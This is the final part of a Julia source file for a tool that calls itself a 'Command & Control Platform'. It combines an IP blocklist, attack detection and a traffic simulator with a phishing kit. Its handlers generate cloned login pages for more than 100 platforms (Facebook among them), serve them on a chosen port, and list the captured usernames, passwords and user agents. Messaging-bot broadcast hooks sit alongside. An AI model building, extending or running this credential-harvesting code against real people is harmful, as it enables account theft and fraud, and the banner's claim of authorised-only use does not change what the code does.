register_handler!("list", (app, args) -> begin
    ips = list_ips(app.blockchain)
    io = IOBuffer()
    println(io, "total: $(length(ips))")
    limit = min(200, length(ips))
    for i in 1:limit
        r = ips[i]
        println(io, "  $(r.ip)  [$(r.note)]  $(r.added_at)")
    end
    if length(ips) > 200
        println(io, "  ... ($(length(ips) - 200) more)")
    end
    Dict("success"=>true, "output"=>String(take!(io)))
end)

register_handler!("exists", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: exists <ip>")
    Dict("success"=>true, "output" => ip_exists(app.blockchain, args[1]) ? "YES" : "NO")
end)

register_handler!("stats", (app, args) -> begin
    s = chain_stats(app.blockchain)
    out = "chain statistics\n" *
          "-----------------\n" *
          "  blocks      : $(s["blocks"])\n" *
          "  unique IPs  : $(s["unique_ips"])\n" *
          "  chain valid : $(s["valid"])\n" *
          "  last hash   : $(s["last_hash"])\n"
    Dict("success"=>true, "output"=>out)
end)

register_handler!("validate", (app, args) -> begin
    ok = chain_valid(app.blockchain)
    Dict("success"=>true, "output" => ok ? "chain VALID" : "chain INVALID")
end)

register_handler!("save", (app, args) -> begin
    save_chain(app.blockchain, app.save_path)
    Dict("success"=>true, "output"=>"chain saved to $(app.save_path)")
end)

register_handler!("block", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: block <ip> [reason]")
    reason = length(args) > 1 ? join(args[2:end], " ") : "manual"
    block_ip!(app.blocklist, args[1], reason, app.logger)
    Dict("success"=>true, "output"=>"blocked $(args[1])")
end)

register_handler!("unblock", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: unblock <ip>")
    unblock_ip!(app.blocklist, args[1], app.logger)
    Dict("success"=>true, "output"=>"unblocked $(args[1])")
end)

register_handler!("blocked", (app, args) -> begin
    lock(app.blocklist.lock)
    try
        io = IOBuffer()
        println(io, "blocked IPs: $(length(app.blocklist.blocked))")
        for ip in app.blocklist.blocked
            println(io, "  $ip  ($(get(app.blocklist.reasons, ip, "")))")
        end
        return Dict("success"=>true, "output"=>String(take!(io)))
    finally
        unlock(app.blocklist.lock)
    end
end)

register_handler!("sim", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: sim start|stop|burst ...")
    sub = lowercase(args[1])
    if sub == "start"
        rate = length(args) >= 2 ? parse(Int, args[2]) : 200
        start_simulation!(app.simulator, app.detection, app.stats, app.logger, rate)
        return Dict("success"=>true, "output"=>"simulator started at $rate pkt/s")
    elseif sub == "stop"
        stop_simulation!(app.simulator, app.logger)
        return Dict("success"=>true, "output"=>"simulator stopped")
    elseif sub == "burst"
        length(args) >= 3 || return Dict("success"=>false, "output"=>"usage: sim burst <n> <pps>")
        n = parse(Int, args[2]); pps = parse(Int, args[3])
        @async begin
            for i in 1:n
                interval = 1.0 / pps
                for _ in 1:pps
                    ev = random_packet!(app.simulator)
                    record!(app.stats, ev)
                    process_packet!(app.detection, ev, app.logger)
                    sleep(interval)
                end
                logmsg(app.logger, :info, "burst $i/$n done")
            end
        end
        return Dict("success"=>true, "output"=>"launched $n bursts @ $pps pkt/s")
    end
    Dict("success"=>false, "output"=>"unknown sim subcommand")
end)

register_handler!("top", (app, args) -> begin
    k = isempty(args) ? 10 : parse(Int, args[1])
    io = IOBuffer()
    println(io, "top $k talkers:")
    for (ip, c) in top_talkers(app.stats, k)
        println(io, "  $ip  ->  $c packets")
    end
    Dict("success"=>true, "output"=>String(take!(io)))
end)

register_handler!("alerts", (app, args) -> begin
    k = isempty(args) ? 20 : parse(Int, args[1])
    lock(app.detection.lock)
    try
        n = length(app.detection.alerts)
        start = max(1, n - k + 1)
        io = IOBuffer()
        println(io, "showing last $(min(k, n)) of $n alerts:")
        for i in start:n
            a = app.detection.alerts[i]
            println(io, "  [$(a.timestamp)] $(a.alert_type) ($(a.severity)) src=$(a.src_ip)")
            println(io, "      $(a.detail)")
        end
        return Dict("success"=>true, "output"=>String(take!(io)))
    finally
        unlock(app.detection.lock)
    end
end)

register_handler!("reset", (app, args) -> begin
    lock(app.detection.lock)
    try
        empty!(app.detection.dos_counts)
        empty!(app.detection.ddos_unique)
        app.detection.ddos_total = 0
        empty!(app.detection.http_counts)
        empty!(app.detection.https_counts)
    finally
        unlock(app.detection.lock)
    end
    Dict("success"=>true, "output"=>"detection counters reset")
end)

register_handler!("clearalerts", (app, args) -> begin
    lock(app.detection.lock)
    try
        empty!(app.detection.alerts)
    finally
        unlock(app.detection.lock)
    end
    Dict("success"=>true, "output"=>"alerts cleared")
end)

register_handler!("phish", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: phish <platform>")
    platform = lowercase(args[1])
    html = generate_phish_html(platform)
    id = platform * "_" * string(rand(1000:9999))
    app.phishing.db[id] = Dict("platform"=>platform, "html"=>html,
                                "credentials"=>Any[], "clicks"=>0)
    Dict("success"=>true, "output"=>
        "phishing page generated: id=$id (platform=$platform)\n" *
        "start with: phish_start <port>")
end)

register_handler!("phish_start", (app, args) -> begin
    port = isempty(args) ? 8080 : parse(Int, args[1])
    if isempty(app.phishing.db)
        return Dict("success"=>false, "output"=>"no phishing page; run 'phish <platform>' first")
    end
    link_id = ""
    for k in keys(app.phishing.db); link_id = k; end
    html = app.phishing.db[link_id]["html"]
    start_phishing_server!(app.phishing, link_id, html, port, app.logger)
    Dict("success"=>true, "output"=>"phishing server started on :$port (link=$link_id)")
end)

register_handler!("phish_stop", (app, args) -> begin
    stop_phishing_server!(app.phishing, app.logger)
    Dict("success"=>true, "output"=>"phishing server stopped")
end)

register_handler!("phish_list", (app, args) -> begin
    io = IOBuffer()
    println(io, "captured credentials:")
    lock(app.phishing.lock)
    try
        for (link, data) in app.phishing.db
            println(io, "  link $link ($(data["platform"])) -- clicks=$(data["clicks"]), creds=$(length(data["credentials"]))")
            for c in data["credentials"]
                println(io, "      user=$(c["user"])  pass=$(c["password"])  ua=$(c["user_agent"])")
            end
        end
    finally
        unlock(app.phishing.lock)
    end
    Dict("success"=>true, "output"=>String(take!(io)))
end)

register_handler!("phish_platforms", (app, args) -> begin
    names = sort(collect(keys(PHISH_PLATFORMS)))
    Dict("success"=>true, "output"=>
        "available phishing templates ($(length(names))):\n" * join(names, ", "))
end)

register_handler!("bot_discord", (app, args) -> begin
    length(args) >= 2 || return Dict("success"=>false, "output"=>"usage: bot_discord <token> <channel>")
    app.bots.discord.enabled = true
    app.bots.discord.token = args[1]
    app.bots.discord.channel = args[2]
    Dict("success"=>true, "output"=>"discord bot registered")
end)

register_handler!("bot_telegram", (app, args) -> begin
    length(args) >= 2 || return Dict("success"=>false, "output"=>"usage: bot_telegram <token> <chat_id>")
    app.bots.telegram.enabled = true
    app.bots.telegram.token = args[1]
    app.bots.telegram.chat_id = args[2]
    Dict("success"=>true, "output"=>"telegram bot registered")
end)

register_handler!("bot_slack", (app, args) -> begin
    length(args) >= 2 || return Dict("success"=>false, "output"=>"usage: bot_slack <token> <channel>")
    app.bots.slack.enabled = true
    app.bots.slack.token = args[1]
    app.bots.slack.channel = args[2]
    Dict("success"=>true, "output"=>"slack bot registered")
end)

register_handler!("bot_whatsapp", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: bot_whatsapp <phone>")
    app.bots.whatsapp.enabled = true
    app.bots.whatsapp.phone = args[1]
    Dict("success"=>true, "output"=>"whatsapp bot registered")
end)

register_handler!("bot_gchat", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: bot_gchat <webhook>")
    app.bots.gchat.enabled = true
    app.bots.gchat.webhook = args[1]
    Dict("success"=>true, "output"=>"google chat bot registered")
end)

register_handler!("bot_signal", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: bot_signal <number>")
    app.bots.signal.enabled = true
    app.bots.signal.number = args[1]
    Dict("success"=>true, "output"=>"signal bot registered")
end)

register_handler!("bots", (app, args) -> begin
    b = app.bots
    io = IOBuffer()
    println(io, "bot status")
    println(io, "-----------")
    println(io, "  discord   : $(b.discord.enabled  ? "enabled (channel=$(b.discord.channel))" : "disabled")")
    println(io, "  telegram  : $(b.telegram.enabled ? "enabled (chat=$(b.telegram.chat_id))"    : "disabled")")
    println(io, "  slack     : $(b.slack.enabled    ? "enabled (channel=$(b.slack.channel))"    : "disabled")")
    println(io, "  whatsapp  : $(b.whatsapp.enabled ? "enabled ($(b.whatsapp.phone))"           : "disabled")")
    println(io, "  gchat     : $(b.gchat.enabled    ? "enabled (webhook set)"                   : "disabled")")
    println(io, "  signal    : $(b.signal.enabled   ? "enabled ($(b.signal.number))"            : "disabled")")
    Dict("success"=>true, "output"=>String(take!(io)))
end)

register_handler!("broadcast", (app, args) -> begin
    isempty(args) && return Dict("success"=>false, "output"=>"usage: broadcast <msg>")
    msg = join(args, " ")
    send_to_all_bots(app.bots, msg, app.logger)
    Dict("success"=>true, "output"=>"broadcast dispatched to enabled bots")
end)

register_handler!("dash_start", (app, args) -> begin
    port = isempty(args) ? 5000 : parse(Int, args[1])
    app.dashboard.port = port
    start_dashboard!(app.dashboard, app.logger)
    Dict("success"=>true, "output"=>"dashboard started on http://0.0.0.0:$port")
end)

register_handler!("dash_stop", (app, args) -> begin
    stop_dashboard!(app.dashboard, app.logger)
    Dict("success"=>true, "output"=>"dashboard stopped")
end)

register_handler!("clear", (app, args) -> begin
    print("\033[2J\033[H")
    Dict("success"=>true, "output"=>"")
end)

# ---- dashboard helpers ----------------------------------------------------

function dashboard_stats(app::App)::Dict{String,Any}
    cs = chain_stats(app.blockchain)
    protocols = lock(app.stats.lock) do
        Dict(
            "tcp"   => get(app.stats.proto_counts, :tcp, 0),
            "udp"   => get(app.stats.proto_counts, :udp, 0),
            "icmp"  => get(app.stats.proto_counts, :icmp, 0),
            "http"  => get(app.stats.proto_counts, :http, 0),
            "https" => get(app.stats.proto_counts, :https, 0)
        )
    end
    severity = Dict("critical"=>0, "high"=>0, "medium"=>0, "low"=>0)
    alert_count = lock(app.detection.lock) do
        for a in app.detection.alerts
            s = string(a.severity)
            severity[s] = get(severity, s, 0) + 1
        end
        length(app.detection.alerts)
    end
    creds = lock(app.phishing.lock) do
        total = 0
        for (_, data) in app.phishing.db
            total += length(data["credentials"])
        end
        total
    end
    return Dict(
        "commands"    => app.command_count,
        "alerts"      => alert_count,
        "blocked_ips" => length(app.blocklist.blocked),
        "credentials" => creds,
        "blocks"      => cs["blocks"],
        "protocols"   => protocols,
        "severity"    => severity
    )
end

function dashboard_alerts(app::App)::String
    lock(app.detection.lock)
    try
        n = length(app.detection.alerts)
        start = max(1, n - 30 + 1)
        arr = Any[]
        for i in start:n
            a = app.detection.alerts[i]
            push!(arr, Dict(
                "timestamp" => string(a.timestamp),
                "type"      => a.alert_type,
                "src"       => a.src_ip,
                "severity"  => string(a.severity)
            ))
        end
        return to_json(Dict("alerts" => arr))
    finally
        unlock(app.detection.lock)
    end
end

# ============================================================================
# SECTION 16: REPL
# ============================================================================

function print_banner()
    println("""
    ======================================================================
      ██╗  ██╗██╗██╗  ██╗██╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗
      ██║ ██╔╝██║██║ ██╔╝██║    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝
      █████╔╝ ██║█████╔╝ ██║    ███████╗█████╗  ██████╔╝██║   ██║█████╗
      ██╔═██╗ ██║██╔═██╗ ██║    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝
      ██║  ██╗██║██║  ██╗██║    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗
      ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝
                  v$APP_VERSION  -  Julia Edition
       Advanced Cybersecurity Command & Control Platform
       Authorized security testing only -- 500+ commands included
    ======================================================================
    """)
end

function repl(app::App)
    print_banner()
    println("type 'help' for commands\n")
    while app.running
        print("kiki> "); flush(stdout)
        line = try
            readline()
        catch
            break
        end
        isempty(strip(line)) && continue
        lc = lowercase(strip(line))
        if lc == "quit" || lc == "exit"
            app.running = false
            break
        end
        result = execute_command(app, line, "cli")
        if !isempty(result["output"])
            println(result["output"])
        end
        if result["success"]
            println("done in $(result["execution_time"])s")
        else
            println("failed")
        end
    end
    app.simulator.running = false
    stop_dashboard!(app.dashboard, app.logger)
    stop_phishing_server!(app.phishing, app.logger)
    try
        save_chain(app.blockchain, app.save_path)
        println("\nchain saved to $(app.save_path)")
    catch e
        println("failed to save chain: $e")
    end
    println("goodbye.")
end

# ============================================================================
# SECTION 17: SELF-TEST
# ============================================================================

function self_test()
    println("running self-test...")

    @assert is_valid_ip("192.168.1.1")
    @assert is_valid_ip("::1")
    @assert !is_valid_ip("999.999.999.999")

    bc = IPBlockchain()
    @assert length(bc.chain) == 1
    @assert chain_valid(bc)

    lg = Logger(:error)
    n = add_ips!(bc, ["10.0.0.1","10.0.0.2","10.0.0.3"], "test", "selftest", lg)
    @assert n == 3
    @assert chain_valid(bc)
    @assert ip_exists(bc, "10.0.0.1")
    @assert !ip_exists(bc, "10.0.0.99")

    de = DetectionEngine()
    ts = TrafficStats()
    for i in 1:150
        ev = PacketEvent(now(), "1.1.1.1", "2.2.2.2", 1234, 80, :tcp, 100, "SYN")
        record!(ts, ev)
        process_packet!(de, ev, lg)
    end
    @assert length(de.alerts) >= 1

    ips = generate_bulk_ips(500)
    @assert length(ips) == 500

    @assert length(PHISH_PLATFORMS) >= 100
    html = generate_phish_html("facebook")
    @assert occursin("Facebook", html)

    r = render_template(["ping","-c","{count}","{target}"], ["5","8.8.8.8"])
    @assert r == ["ping","-c","5","8.8.8.8"]

    j = to_json(Dict("a"=>1, "b"=>"x"))
    @assert occursin("\"a\":1", j)

    println("all self-tests passed")
end

# ============================================================================
# SECTION 18: MAIN
# ============================================================================

function main(args::Vector{String})
    if "--selftest" in args
        self_test()
        return
    end
    logpath = "--log" in args ? LOG_FILE : nothing
    app = App(logpath=logpath)
    if "--dashboard" in args
        start_dashboard!(app.dashboard, app.logger)
    end
    if "--simulate" in args
        start_simulation!(app.simulator, app.detection, app.stats, app.logger, 200)
    end
    repl(app)
end

end # module KikiServerV1

if abspath(PROGRAM_FILE) == @__FILE__
    KikiServerV1.main(ARGS)
end
